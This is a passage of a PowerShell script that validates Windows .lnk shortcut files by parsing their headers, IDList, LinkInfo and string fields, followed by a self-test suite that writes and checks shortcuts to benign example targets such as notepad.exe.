    $iconData = $null

    if ($hasName) {

        $nameData = Parse-StringData `
            -Bytes $bytes `
            -Offset $position `
            -IsUnicode $isUnicode `
            -Name 'NAME_STRING'

        $position = $nameData.EndOffset
    }

    if ($hasRelativePath) {

        $relativeData = Parse-StringData `
            -Bytes $bytes `
            -Offset $position `
            -IsUnicode $isUnicode `
            -Name 'RELATIVE_PATH'

        $position = $relativeData.EndOffset
    }

    if ($hasWorkingDir) {

        $workingData = Parse-StringData `
            -Bytes $bytes `
            -Offset $position `
            -IsUnicode $isUnicode `
            -Name 'WORKING_DIR'

        $position = $workingData.EndOffset
    }

    if ($hasArguments) {

        $argumentsData = Parse-StringData `
            -Bytes $bytes `
            -Offset $position `
            -IsUnicode $isUnicode `
            -Name 'COMMAND_LINE_ARGUMENTS'

        $position = $argumentsData.EndOffset
    }

    if ($hasIcon) {

        $iconData = Parse-StringData `
            -Bytes $bytes `
            -Offset $position `
            -IsUnicode $isUnicode `
            -Name 'ICON_LOCATION'

        $position = $iconData.EndOffset
    }
# ------------------------------------------------------------------------
    # ExtraData + TerminalBlock
    # ------------------------------------------------------------------------

    $extraData = Parse-ExtraData `
        -Bytes $bytes `
        -Offset $position

    # ------------------------------------------------------------------------
    # ExtraData / LinkFlags consistency
    # ------------------------------------------------------------------------

    $signatures = @{}

    foreach ($block in $extraData.Blocks) {
        $signatures[[uint32]$block.Signature] = $true
    }

    if (
        ($flags -band $script:FLAG_HAS_EXP_STRING) -ne 0 -and
        -not $signatures.ContainsKey(
            [uint32]$script:EXTRA_ENVIRONMENT
        )
    ) {

        Throw-ShellLinkError `
            "HasExpString is set but no EnvironmentVariableDataBlock exists."
    }

    if (
        ($flags -band $script:FLAG_HAS_DARWIN_ID) -ne 0 -and
        -not $signatures.ContainsKey(
            [uint32]$script:EXTRA_DARWIN
        )
    ) {

        Throw-ShellLinkError `
            "HasDarwinID is set but no DarwinDataBlock exists."
    }

    if (
        ($flags -band $script:FLAG_HAS_EXP_ICON) -ne 0 -and
        -not $signatures.ContainsKey(
            [uint32]$script:EXTRA_ICON_ENVIRONMENT
        )
    ) {

        Throw-ShellLinkError `
            "HasExpIcon is set but no IconEnvironmentDataBlock exists."
    }

    if (
        ($flags -band $script:FLAG_RUN_WITH_SHIM_LAYER) -ne 0 -and
        -not $signatures.ContainsKey(
            [uint32]$script:EXTRA_SHIM
        )
    ) {

        Throw-ShellLinkError `
            "RunWithShimLayer is set but no ShimDataBlock exists."
    }

    # ------------------------------------------------------------------------
    # Reconstruct target strictly from actual binary representation.
    # ------------------------------------------------------------------------

    $targetAnsi = $null
    $targetUnicode = $null
    $resolvedTarget = $null
    $targetRepresentation = $null

    # The IDList is what Windows IShellLink::GetPath uses to produce
    # Shortcut.TargetPath, so it is the preferred representation. LinkInfo is
    # kept as the fallback (and for the link's own resolution on the file
    # system) because older tools trim or omit the IDList.
    if (
        $null -ne $idList -and
        -not [string]::IsNullOrWhiteSpace($idList.ReconstructedPath)
    ) {

        $resolvedTarget = $idList.ReconstructedPath
        $targetRepresentation = 'LinkTargetIDList'
    }

    if (
        $null -eq $resolvedTarget -and
        $null -ne $linkInfo -and
        -not $forceNoLinkInfo
    ) {

        if ($null -ne $linkInfo.ReconstructedUnicodeTarget) {

            $targetUnicode = $linkInfo.ReconstructedUnicodeTarget
            $resolvedTarget = $targetUnicode

            $targetRepresentation = `
                'LinkInfo.LocalBasePathUnicode+CommonPathSuffixUnicode'
        }
        elseif ($null -ne $linkInfo.ReconstructedAnsiTarget) {

            $targetAnsi = $linkInfo.ReconstructedAnsiTarget
            $resolvedTarget = $targetAnsi

            $targetRepresentation = `
                'LinkInfo.LocalBasePath+CommonPathSuffix'
        }
    }

    if (
        $null -eq $resolvedTarget -and
        $null -ne $relativeData
    ) {

        $resolvedTarget = $relativeData.Value
        $targetRepresentation = 'StringData.RELATIVE_PATH'
    }

    # ------------------------------------------------------------------------
    # ExpectedTarget
    # ------------------------------------------------------------------------

    if (
        $PSBoundParameters.ContainsKey('ExpectedTarget') -and
        $null -ne $ExpectedTarget -and
        $ExpectedTarget -ne ''
    ) {

        if ($null -eq $resolvedTarget) {

            Throw-ShellLinkError `
                "ExpectedTarget was supplied but the file contains no path representation that this validator can reconstruct."
        }

        $expectedNormalized = Normalize-WindowsPath `
            -Path $ExpectedTarget

        $actualNormalized = Normalize-WindowsPath `
            -Path $resolvedTarget

        if ($expectedNormalized -cne $actualNormalized) {

            Throw-ShellLinkError @"
ExpectedTarget mismatch.

Expected:
  $expectedNormalized

Reconstructed:
  $actualNormalized
"@
        }
    }
# ------------------------------------------------------------------------
    # ExpectedSpec
    # ------------------------------------------------------------------------

    if ($null -ne $ExpectedSpec) {

        if ($ExpectedSpec.ContainsKey('Description')) {

            if ($null -eq $nameData) {

                Throw-ShellLinkError `
                    "Expected Description but NAME_STRING is absent."
            }

            if ($nameData.Value -cne [string]$ExpectedSpec.Description) {

                Throw-ShellLinkError `
                    "Description mismatch."
            }
        }

        if ($ExpectedSpec.ContainsKey('RelativePath')) {

            if ($null -eq $relativeData) {

                Throw-ShellLinkError `
                    "Expected RelativePath but RELATIVE_PATH is absent."
            }

            $expectedRelative = Normalize-WindowsPath `
                -Path ([string]$ExpectedSpec.RelativePath)

            if ($relativeData.Value -cne $expectedRelative) {

                Throw-ShellLinkError `
                    "RelativePath mismatch."
            }
        }

        if ($ExpectedSpec.ContainsKey('WorkingDirectory')) {

            if ($null -eq $workingData) {

                Throw-ShellLinkError `
                    "Expected WorkingDirectory but WORKING_DIR is absent."
            }

            $expectedWorking = Normalize-WindowsPath `
                -Path ([string]$ExpectedSpec.WorkingDirectory)

            if ($workingData.Value -cne $expectedWorking) {

                Throw-ShellLinkError `
                    "WorkingDirectory mismatch."
            }
        }

        if ($ExpectedSpec.ContainsKey('Arguments')) {

            if ($null -eq $argumentsData) {

                Throw-ShellLinkError `
                    "Expected Arguments but COMMAND_LINE_ARGUMENTS is absent."
            }

            if ($argumentsData.Value -cne [string]$ExpectedSpec.Arguments) {

                Throw-ShellLinkError `
                    "Arguments mismatch."
            }
        }

        if ($ExpectedSpec.ContainsKey('IconLocation')) {

            if ($null -eq $iconData) {

                Throw-ShellLinkError `
                    "Expected IconLocation but ICON_LOCATION is absent."
            }

            $expectedIcon = Normalize-WindowsPath `
                -Path ([string]$ExpectedSpec.IconLocation)

            if ($iconData.Value -cne $expectedIcon) {

                Throw-ShellLinkError `
                    "IconLocation mismatch."
            }
        }
    }

    # ------------------------------------------------------------------------
    # PowerShell 5.1-compatible precomputation for conditional properties
    # ------------------------------------------------------------------------

    $nameValue = $null
    $relativeValue = $null
    $workingValue = $null
    $argumentsValue = $null
    $iconValue = $null

    if ($null -ne $nameData) {
        $nameValue = $nameData.Value
    }

    if ($null -ne $relativeData) {
        $relativeValue = $relativeData.Value
    }

    if ($null -ne $workingData) {
        $workingValue = $workingData.Value
    }

    if ($null -ne $argumentsData) {
        $argumentsValue = $argumentsData.Value
    }

    if ($null -ne $iconData) {
        $iconValue = $iconData.Value
    }

    $stringDataObject = [pscustomobject]@{
        Name         = $nameValue
        RelativePath = $relativeValue
        WorkingDir   = $workingValue
        Arguments    = $argumentsValue
        IconLocation = $iconValue
    }

    return [pscustomobject]@{
        Valid               = $true
        Path                = $Path
        FileLength          = $bytes.Length

        Header              = $header

        LinkFlags           = [pscustomobject]@{
            HasLinkTargetIDList = $hasIdList
            HasLinkInfo         = $hasLinkInfo
            HasName             = $hasName
            HasRelativePath     = $hasRelativePath
            HasWorkingDir       = $hasWorkingDir
            HasArguments        = $hasArguments
            HasIconLocation     = $hasIcon
            IsUnicode           = $isUnicode
            ForceNoLinkInfo     = $forceNoLinkInfo
        }

        LinkTargetIDList    = $idList
        LinkInfo            = $linkInfo
        StringData          = $stringDataObject
        ExtraData           = $extraData

        TargetPath           = $targetAnsi
        TargetUnicode        = $targetUnicode
        ResolvedTarget       = $resolvedTarget
        TargetRepresentation = $targetRepresentation

        Description          = $nameValue
        RelativePath         = $relativeValue
        WorkingDir           = $workingValue
        Arguments            = $argumentsValue
        IconLocation         = $iconValue

        TerminalBlock        = $true
        TerminalBlockOffset  = $extraData.TerminalOffset
    }
}
# ============================================================================
# Self-test helpers
# ============================================================================

function Assert-Equal {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Actual,

        [Parameter(Mandatory = $true)]
        [object]$Expected,

        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    if ($Actual -ne $Expected) {

        throw `
            "ASSERT FAILED: $Message. Expected '$Expected'; got '$Actual'."
    }
}

function Assert-True {
    param(
        [Parameter(Mandatory = $true)]
        [bool]$Condition,

        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    if (-not $Condition) {
        throw "ASSERT FAILED: $Message"
    }
}

function Invoke-ShellLinkTest {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [scriptblock]$Body,

        [Parameter(Mandatory = $true)]
        [ref]$Passed,

        [Parameter(Mandatory = $true)]
        [ref]$Failed
    )

    try {

        & $Body

        Write-Host ("PASS  {0}" -f $Name)

        $Passed.Value++
    }
    catch {

        Write-Host (
            "FAIL  {0}: {1}" -f
            $Name,
            $_.Exception.Message
        )

        $Failed.Value++
    }
}

function Expect-ValidationFailure {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [string]$ExpectedTarget,

        [hashtable]$ExpectedSpec
    )

    $failed = $false

    try {

        $params = @{
            Path = $Path
        }

        if ($PSBoundParameters.ContainsKey('ExpectedTarget')) {
            $params.ExpectedTarget = $ExpectedTarget
        }

        if ($PSBoundParameters.ContainsKey('ExpectedSpec')) {
            $params.ExpectedSpec = $ExpectedSpec
        }

        Validate-ShellLink @params | Out-Null
    }
    catch {

        $failed = $true
    }

    if (-not $failed) {
        throw "Validator unexpectedly accepted malformed input."
    }
}
function Insert-Bytes {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Original,

        [Parameter(Mandatory = $true)]
        [int]$Offset,

        [Parameter(Mandatory = $true)]
        [byte[]]$Insert
    )

    if (
        $Offset -lt 0 -or
        $Offset -gt $Original.Length
    ) {
        throw "Insert-Bytes: invalid offset."
    }

    [byte[]]$result = New-Object byte[] (
        $Original.Length + $Insert.Length
    )

    if ($Offset -gt 0) {

        [System.Array]::Copy(
            $Original,
            0,
            $result,
            0,
            $Offset
        )
    }

    if ($Insert.Length -gt 0) {

        [System.Array]::Copy(
            $Insert,
            0,
            $result,
            $Offset,
            $Insert.Length
        )
    }

    if (($Original.Length - $Offset) -gt 0) {

        [System.Array]::Copy(
            $Original,
            $Offset,
            $result,
            $Offset + $Insert.Length,
            $Original.Length - $Offset
        )
    }

    return $result
}

function New-TestIDList {

    # One arbitrary but structurally valid ItemID:
    #
    #   ItemIDSize = 4
    #   Data       = 11 22
    #   TerminalID = 0000
    #
    # IDListSize = 6

    $buffer = New-ByteList

    Write-U16 `
        -Buffer $buffer `
        -Value ([uint16]4)

    $buffer.Add([byte]0x11)
    $buffer.Add([byte]0x22)

    Write-U16 `
        -Buffer $buffer `
        -Value ([uint16]0)

    return [pscustomobject]@{
        Bytes = [byte[]]$buffer.ToArray()
        Size  = 6
    }
}

function New-LinkWithTestIDList {
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$ValidBytes
    )

    $id = New-TestIDList

    [byte[]]$result = Insert-Bytes `
        -Original $ValidBytes `
        -Offset $script:SHELL_LINK_HEADER_SIZE `
        -Insert (
            Join-ByteArrays -Arrays @(
                ([byte[]]@(
                    [byte]($id.Size -band 0xFF),
                    [byte](($id.Size -shr 8) -band 0xFF)
                )),
                $id.Bytes
            )
        )

    [uint32]$flags = Read-U32 `
        -Bytes $result `
        -Offset 20

    $flags = $flags -bor $script:FLAG_HAS_IDLIST

    Set-U32 `
        -Bytes $result `
        -Offset 20 `
        -Value $flags

    return $result
}
# ============================================================================
# Self-test suite
# ============================================================================

function Test-ShellLinkWriter {
    [CmdletBinding()]
    param(
        [switch]$KeepArtifacts
    )

    $root = Join-Path `
        ([System.IO.Path]::GetTempPath()) `
        ('ShellLinkTests-' + [System.Guid]::NewGuid().ToString('N'))

    Ensure-Directory -Path $root

    [int]$passed = 0
    [int]$failed = 0

    try {

        # --------------------------------------------------------------------
        # Valid cases
        # --------------------------------------------------------------------

        $absolutePath = Join-Path $root 'absolute.lnk'

        $absoluteSpec = @{
            TargetPath = 'C:\Windows\System32\notepad.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'absolute Windows executable path' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $absolutePath `
                    -Spec $absoluteSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $absolutePath `
                    -ExpectedTarget $absoluteSpec.TargetPath

                Assert-Equal `
                    $v.Header.HeaderSize `
                    0x4C `
                    'HeaderSize'

                Assert-Equal `
                    $v.LinkInfo.HeaderSize `
                    0x24 `
                    'Unicode LinkInfo header'

                Assert-Equal `
                    $v.ResolvedTarget `
                    $absoluteSpec.TargetPath `
                    'absolute target'

                Assert-True `
                    $v.LinkFlags.HasLinkTargetIDList `
                    'absolute target writes an IDList'

                Assert-Equal `
                    $v.LinkTargetIDList.ReconstructedPath `
                    $absoluteSpec.TargetPath `
                    'IDList reconstructed path'
            }

        Invoke-ShellLinkTest `
            -Name 'canonical LinkTargetIDList bytes' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                $id = New-LinkTargetIDList `
                    -BasePath 'C:\Windows\System32\' `
                    -Suffix 'notepad.exe'

                # IDListSize (u16 LE) counts every byte after the size field.
                $size = $id.Bytes[0] -bor ($id.Bytes[1] -shl 8)
                Assert-Equal $size $id.Size 'IDListSize'

                # My Computer item: 14 00 1f 50 e0 4f d0 20 ea 3a 69 10 a2 d8 08 00 2b 30 30 9d
                Assert-Equal $id.Bytes[2] 0x14 'My Computer cb'
                Assert-Equal $id.Bytes[4] 0x1F 'My Computer class'
                Assert-Equal $id.Bytes[5] 0x50 'My Computer sort index'

                # Volume item: 19 00 2f 43 3a 5c ...
                Assert-Equal $id.Bytes[22] 0x19 'volume cb'
                Assert-Equal $id.Bytes[24] 0x2F 'volume class'
                Assert-Equal $id.Bytes[25] 0x43 'volume C'
                Assert-Equal $id.Bytes[26] 0x3A 'volume colon'
                Assert-Equal $id.Bytes[27] 0x5C 'volume slash'

                # TerminalID is the final zero ItemID.
                $last = $id.Bytes.Length - 2
                Assert-Equal $id.Bytes[$last] 0x00 'TerminalID low'
                Assert-Equal $id.Bytes[$last + 1] 0x00 'TerminalID high'

                # Round trip: parse the items back and reconstruct the path.
                $parsed = New-Object 'System.Collections.Generic.List[object]'
                $off = 2

                while ($off -lt $id.Bytes.Length) {
                    $cb = $id.Bytes[$off] -bor ($id.Bytes[$off + 1] -shl 8)
                    if ($cb -eq 0) { break }
                    $data = New-Object byte[] ($cb - 2)
                    [System.Array]::Copy($id.Bytes, $off + 2, $data, 0, $cb - 2)
                    $parsed.Add([pscustomobject]@{ Data = $data })
                    $off += $cb
                }

                $path = ConvertFrom-LinkTargetIDList `
                    -Items $parsed.ToArray()
                Assert-Equal `
                    $path `
                    'C:\Windows\System32\notepad.exe' `
                    'reconstructed path'
            }

        $rootPath = Join-Path $root 'root.lnk'

        $rootSpec = @{
            TargetPath = 'C:\app.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'root-level path' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $rootPath `
                    -Spec $rootSpec | Out-Null

                Validate-ShellLink `
                    -Path $rootPath `
                    -ExpectedTarget $rootSpec.TargetPath | Out-Null
            }

        $nestedPath = Join-Path $root 'nested.lnk'

        $nestedSpec = @{
            TargetPath = 'C:\Program Files\Example\bin\app.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'nested path' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $nestedPath `
                    -Spec $nestedSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $nestedPath `
                    -ExpectedTarget $nestedSpec.TargetPath

                Assert-Equal `
                    $v.LinkInfo.LocalBasePath `
                    'C:\Program Files\Example\bin\' `
                    'LocalBasePath'

                Assert-Equal `
                    $v.LinkInfo.CommonPathSuffix `
                    'app.exe' `
                    'CommonPathSuffix'

                Assert-Equal `
                    $v.ResolvedTarget `
                    'C:\Program Files\Example\bin\app.exe' `
                    'base + suffix reconstruction'
            }
$spacePath = Join-Path $root 'spaces.lnk'

        $spaceSpec = @{
            TargetPath       = 'D:\Program Files\My App\my app.exe'
            WorkingDirectory = 'D:\Program Files\My App'
            Arguments        = '--test "hello world"'
        }

        Invoke-ShellLinkTest `
            -Name 'path with spaces' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $spacePath `
                    -Spec $spaceSpec | Out-Null

                Validate-ShellLink `
                    -Path $spacePath `
                    -ExpectedTarget $spaceSpec.TargetPath `
                    -ExpectedSpec $spaceSpec | Out-Null
            }

        $unicodePath = Join-Path $root 'unicode.lnk'

        $unicodeSpec = @{
            TargetPath = 'C:\Program Files\テスト\Программа\Αθήνα\应用.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'Unicode target' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $unicodePath `
                    -Spec $unicodeSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $unicodePath `
                    -ExpectedTarget $unicodeSpec.TargetPath

                Assert-Equal `
                    $v.LinkInfo.LocalBasePathUnicode `
                    'C:\Program Files\テスト\Программа\Αθήνα\' `
                    'Unicode base path'

                Assert-Equal `
                    $v.LinkInfo.CommonPathSuffixUnicode `
                    '应用.exe' `
                    'Unicode suffix'

                Assert-Equal `
                    $v.ResolvedTarget `
                    $unicodeSpec.TargetPath `
                    'Unicode reconstructed target'
            }

        $supplementaryPath = Join-Path $root 'supplementary.lnk'

        $supplementarySpec = @{
            TargetPath = 'C:\Data\𐐷\𝄞\app.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'supplementary Unicode surrogate pairs' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $supplementaryPath `
                    -Spec $supplementarySpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $supplementaryPath `
                    -ExpectedTarget $supplementarySpec.TargetPath

                Assert-Equal `
                    $v.ResolvedTarget `
                    $supplementarySpec.TargetPath `
                    'supplementary Unicode target'
            }
$unicodeWorkPath = Join-Path $root 'unicode-workdir.lnk'

        $unicodeWorkSpec = @{
            TargetPath       = 'C:\Apps\пример\app.exe'
            WorkingDirectory = 'C:\Работа\資料'
        }

        Invoke-ShellLinkTest `
            -Name 'Unicode working directory' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $unicodeWorkPath `
                    -Spec $unicodeWorkSpec | Out-Null

                Validate-ShellLink `
                    -Path $unicodeWorkPath `
                    -ExpectedTarget $unicodeWorkSpec.TargetPath `
                    -ExpectedSpec $unicodeWorkSpec | Out-Null
            }

        $unicodeArgsPath = Join-Path $root 'unicode-args.lnk'

        $unicodeArgsSpec = @{
            TargetPath = 'C:\Apps\app.exe'
            Arguments  = '--name "José 李" --mode αβγ --symbol 𝄞'
        }

        Invoke-ShellLinkTest `
            -Name 'Unicode arguments' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $unicodeArgsPath `
                    -Spec $unicodeArgsSpec | Out-Null

                Validate-ShellLink `
                    -Path $unicodeArgsPath `
                    -ExpectedTarget $unicodeArgsSpec.TargetPath `
                    -ExpectedSpec $unicodeArgsSpec | Out-Null
            }

        $descriptionPath = Join-Path $root 'description.lnk'

        $descriptionSpec = @{
            TargetPath  = 'C:\Apps\app.exe'
            Description = 'Example shortcut'
        }

        Invoke-ShellLinkTest `
            -Name 'description' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $descriptionPath `
                    -Spec $descriptionSpec | Out-Null

                Validate-ShellLink `
                    -Path $descriptionPath `
                    -ExpectedTarget $descriptionSpec.TargetPath `
                    -ExpectedSpec $descriptionSpec | Out-Null
            }

        $iconPath = Join-Path $root 'icon.lnk'

        $iconSpec = @{
            TargetPath   = 'C:\Apps\app.exe'
            IconLocation = 'C:\Windows\System32\shell32.dll,0'
        }

        Invoke-ShellLinkTest `
            -Name 'icon location' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $iconPath `
                    -Spec $iconSpec | Out-Null

                Validate-ShellLink `
                    -Path $iconPath `
                    -ExpectedTarget $iconSpec.TargetPath `
                    -ExpectedSpec $iconSpec | Out-Null
            }
$allFieldsPath = Join-Path $root 'all-fields.lnk'

        $allFieldsSpec = @{
            TargetPath       = 'C:\Program Files\Example\example.exe'
            Description      = 'Example'
            RelativePath     = '.\example.exe'
            WorkingDirectory = 'C:\Program Files\Example'
            Arguments        = '--input "αβ.txt" --mode test'
            IconLocation     = 'C:\Windows\System32\shell32.dll,3'
        }

        Invoke-ShellLinkTest `
            -Name 'all StringData fields' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $allFieldsPath `
                    -Spec $allFieldsSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $allFieldsPath `
                    -ExpectedTarget $allFieldsSpec.TargetPath `
                    -ExpectedSpec $allFieldsSpec

                Assert-True `
                    $v.LinkFlags.HasName `
                    'HasName'

                Assert-True `
                    $v.LinkFlags.HasRelativePath `
                    'HasRelativePath'

                Assert-True `
                    $v.LinkFlags.HasWorkingDir `
                    'HasWorkingDir'

                Assert-True `
                    $v.LinkFlags.HasArguments `
                    'HasArguments'

                Assert-True `
                    $v.LinkFlags.HasIconLocation `
                    'HasIconLocation'
            }

        $noStringsPath = Join-Path $root 'no-strings.lnk'

        $noStringsSpec = @{
            TargetPath = 'C:\Windows\System32\calc.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'no optional StringData' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $noStringsPath `
                    -Spec $noStringsSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $noStringsPath `
                    -ExpectedTarget $noStringsSpec.TargetPath

                Assert-True `
                    (-not $v.LinkFlags.HasName) `
                    'HasName clear'

                Assert-True `
                    (-not $v.LinkFlags.HasRelativePath) `
                    'HasRelativePath clear'

                Assert-True `
                    (-not $v.LinkFlags.HasWorkingDir) `
                    'HasWorkingDir clear'

                Assert-True `
                    (-not $v.LinkFlags.HasArguments) `
                    'HasArguments clear'

                Assert-True `
                    (-not $v.LinkFlags.HasIconLocation) `
                    'HasIconLocation clear'
            }

        $barePath = Join-Path $root 'bare.lnk'

        $bareSpec = @{
            TargetPath = 'example.exe'
        }

        Invoke-ShellLinkTest `
            -Name 'bare relative filename' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $barePath `
                    -Spec $bareSpec | Out-Null

                $v = Validate-ShellLink `
                    -Path $barePath `
                    -ExpectedTarget 'example.exe'

                Assert-Equal `
                    $v.TargetRepresentation `
                    'StringData.RELATIVE_PATH' `
                    'relative target representation'
            }

        $forwardPath = Join-Path $root 'forward-slash.lnk'

        $forwardSpec = @{
            TargetPath       = 'D:/Program Files/App/app.exe'
            WorkingDirectory = 'D:/Program Files/App'
            Arguments        = '-x'
            IconLocation     = 'D:/Program Files/App/app.exe,0'
        }

        Invoke-ShellLinkTest `
            -Name 'forward-slash normalization' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $forwardPath `
                    -Spec $forwardSpec | Out-Null

                Validate-ShellLink `
                    -Path $forwardPath `
                    -ExpectedTarget 'D:\Program Files\App\app.exe' `
                    -ExpectedSpec $forwardSpec | Out-Null
            }
# --------------------------------------------------------------------
        # Independent raw-byte writer test
        # --------------------------------------------------------------------

        $rawPath = Join-Path $root 'raw-layout.lnk'

        $rawSpec = @{
            TargetPath       = 'C:\Program Files\Example\example.exe'
            Description      = 'Raw'
            RelativePath     = '.\example.exe'
            WorkingDirectory = 'C:\Program Files\Example'
            Arguments        = '--α "β"'
            IconLocation     = 'C:\Windows\System32\shell32.dll,0'
        }

        Invoke-ShellLinkTest `
            -Name 'independent raw-byte layout verification' `
            -Passed ([ref]$passed) `
            -Failed ([ref]$failed) `
            -Body {

                Write-ShellLink `
                    -Path $rawPath `
                    -Spec $rawSpec | Out-Null

                [byte[]]$raw = Read-AllBytes -Path $rawPath

                Assert-Equal `
                    (Read-U32 -Bytes $raw -Offset 0) `
                    0x4C `
                    'raw HeaderSize'

                for ($i = 0; $i -lt 16; $i++) {

                    Assert-Equal `
                        $raw[4 + $i] `
                        $script:SHELL_LINK_CLSID[$i] `
                        "raw CLSID byte $i"
                }

                [uint32]$rawFlags = Read-U32 `
                    -Bytes $raw `
                    -Offset 20

                Assert-True `
                    (($rawFlags -band $script:FLAG_HAS_LINKINFO) -ne 0) `
                    'raw HasLinkInfo'

                Assert-True `
                    (($rawFlags -band $script:FLAG_IS_UNICODE) -ne 0) `
                    'raw IsUnicode'

                [int]$li = 0x4C

                # The writer emits a LinkTargetIDList before LinkInfo for
                # drive-rooted ASCII file targets - leap past it when present.
                if (($rawFlags -band $script:FLAG_HAS_IDLIST) -ne 0) {

                    [uint32]$idListSize = Read-U16 `
                        -Bytes $raw `
                        -Offset 0x4C

                    $li = 0x4E + [int]$idListSize

                    Assert-True `
                        ($idListSize -gt 2) `
                        'raw IDListSize sane'
                }

                [uint32]$liSize = Read-U32 `
                    -Bytes $raw `
                    -Offset $li

                [uint32]$liHeader = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 4)

                [uint32]$liFlags = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 8)

                [uint32]$volOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 12)

                [uint32]$baseOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 16)

                [uint32]$networkOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 20)

                [uint32]$suffixOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 24)

                [uint32]$baseUnicodeOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 28)

                [uint32]$suffixUnicodeOffset = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + 32)

                Assert-Equal `
                    $liHeader `
                    0x24 `
                    'raw LinkInfoHeaderSize'

                Assert-Equal `
                    $liFlags `
                    1 `
                    'raw LinkInfoFlags'

                Assert-Equal `
                    $networkOffset `
                    0 `
                    'raw CommonNetworkRelativeLinkOffset'

                Assert-True `
                    ($volOffset -ge $liHeader) `
                    'raw VolumeIDOffset'

                Assert-True `
                    ($baseOffset -gt $volOffset) `
                    'raw LocalBasePathOffset'

                Assert-True `
                    ($suffixOffset -gt $baseOffset) `
                    'raw CommonPathSuffixOffset'

                Assert-True `
                    ($baseUnicodeOffset -gt $suffixOffset) `
                    'raw LocalBasePathOffsetUnicode'

                Assert-True `
                    ($suffixUnicodeOffset -gt $baseUnicodeOffset) `
                    'raw CommonPathSuffixOffsetUnicode'

                [uint32]$volumeSize = Read-U32 `
                    -Bytes $raw `
                    -Offset ($li + [int]$volOffset)

                Assert-Equal `
                    $volumeSize `
                    0x11 `
                    'raw VolumeIDSize'

                Assert-Equal `
                    $raw[$li + [int]$volOffset + 16] `
                    0 `
                    'raw VolumeID NUL label'
$ansiBase = Read-AnsiZ `
                    -Bytes $raw `
                    -Offset ($li + [int]$baseOffset) `
                    -End ($li + [int]$liSize) `
                    -What 'raw LocalBasePath'

                $ansiSuffix = Read-AnsiZ `
                    -Bytes $raw `
                    -Offset ($li + [int]$suffixOffset) `
                    -End ($li + [int]$liSize) `
                    -What 'raw CommonPathSuffix'

                $unicodeBase = Read-UnicodeZ `
                    -Bytes $raw `
                    -Offset ($li + [int]$baseUnicodeOffset) `
                    -End ($li + [int]$liSize) `
                    -What 'raw LocalBasePathUnicode'

                $unicodeSuffix = Read-UnicodeZ `
                    -Bytes $raw `
                    -Offset ($li + [int]$suffixUnicodeOffset) `
                    -End ($li + [int]$liSize) `
                    -What 'raw CommonPathSuffixUnicode'

                Assert-Equal `
                    $ansiBase.Value `
                    'C:\Program Files\Example\' `
                    'raw ANSI base'

                Assert-Equal `
                    $ansiSuffix.Value `
                    'example.exe' `
                    'raw ANSI suffix'

                Assert-Equal `
                    $unicodeBase.Value `
                    'C:\Program Files\Example\' `
                    'raw Unicode base'

                Assert-Equal `
                    $unicodeSuffix.Value `
                    'example.exe' `
                    'raw Unicode suffix'

                Assert-Equal `
                    $ansiBase.End `
                    ($li + [int]$suffixOffset) `
                    'ANSI base terminates exactly before suffix'

                Assert-Equal `
                    $ansiSuffix.End `
                    ($li + [int]$baseUnicodeOffset) `
                    'ANSI suffix terminates exactly before Unicode base'

                Assert-Equal `
                    $unicodeBase.End `
                    ($li + [int]$suffixUnicodeOffset) `
                    'Unicode base terminates exactly before Unicode suffix'

                # StringData starts after LinkInfo.
                $stringPosition = $li + [int]$liSize

                $name = Parse-StringData `
                    -Bytes $raw `
                    -Offset $stringPosition `
                    -IsUnicode $true `
                    -Name 'raw NAME_STRING'

                Assert-Equal `
                    $name.CountCharacters `
                    ([uint16]'Raw'.Length) `
